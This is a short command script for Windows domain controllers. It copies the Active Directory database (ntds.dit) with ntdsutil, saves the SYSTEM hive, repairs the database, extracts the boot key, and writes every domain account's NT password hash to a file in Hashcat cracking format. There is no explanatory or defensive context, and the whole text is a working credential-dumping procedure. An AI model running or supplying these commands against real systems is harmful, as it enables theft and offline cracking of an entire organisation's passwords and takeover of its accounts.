mkdir c:\extracted
ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\extracted' q q
reg SAVE HKLM\SYSTEM c:\extracted\SYSTEM
esentutl /p 'c:\extracted\Active Directory\ntds.dit' /!10240 /8 /o
$key = Get-BootKey -SystemHivePath 'c:\extracted\SYSTEM'
Get-ADDBAccount -All -DBPath 'C:\extracted\Active Directory\ntds.dit' -BootKey $key | Format-Custom -View HashcatNT | Out-File c:\extracted\hashes.txt -Encoding ASCII
cat c:\extracted\hashes.txt

